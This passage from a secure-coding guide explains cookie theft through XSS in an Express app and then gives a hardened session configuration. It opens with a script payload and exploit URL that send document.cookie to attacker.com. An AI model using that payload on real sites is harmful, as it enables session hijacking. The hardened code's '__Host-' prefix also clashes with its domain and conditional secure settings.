**Attack Payload**:
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Exploitation URL**:
```text
https://example.com/profile?name=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Why This Is Dangerous**:
- Without `httpOnly`, JavaScript can read `document.cookie` and steal session tokens
- Without `secure`, cookies are transmitted over unencrypted HTTP connections
- Without `sameSite`, cookies are sent with cross-origin requests enabling CSRF attacks
- The hardcoded weak secret can be guessed or brute-forced
- XSS in the profile page allows attackers to inject cookie-stealing scripts

**SECURE VERSION**:

```javascript
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const helmet = require('helmet');
const { escape } = require('html-escaper');

const app = express();

// Security headers including CSP
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"]
    }
  }
}));

// SECURE: Properly configured session
app.use(session({
  secret: process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex'),
  name: '__Host-sessionId', // Cookie prefix for additional security
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,    // Prevents JavaScript access to cookies
    secure: process.env.NODE_ENV === 'production', // HTTPS only in production
    sameSite: 'strict', // Prevents CSRF attacks
    maxAge: 3600000,    // 1 hour - shorter session lifetime
    path: '/',
    domain: process.env.COOKIE_DOMAIN
  }
}));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // Assuming authentication succeeds
  req.session.regenerate((err) => { // Regenerate session ID on login
    if (err) {
      console.error('Session regeneration failed:', err);
      return res.status(500).json({ error: 'Authentication failed' });
    }
    req.session.userId = username;
    req.session.isAuthenticated = true;
    res.json({ message: 'Logged in successfully' });
  });
});

// SECURE: Output encoding prevents XSS
app.get('/profile', (req, res) => {
  const username = escape(req.query.name || 'Guest'); // HTML encode user input
  res.send(`<html><body><h1>Welcome, ${username}</h1></body></html>`);
});

app.listen(3000);
```

**Key Security Controls**:
- `httpOnly: true` - Prevents JavaScript from accessing cookies via `document.cookie`, blocking XSS-based cookie theft
- `secure: true` - Ensures cookies are only sent over HTTPS, preventing interception
- `sameSite: 'strict'` - Prevents cookies from being sent with cross-site requests, blocking CSRF
- `session.regenerate()` - Creates new session ID on login, preventing session fixation
- `helmet()` with CSP - Adds Content Security Policy headers that block inline scripts
- `escape()` - HTML-encodes user input, preventing XSS injection

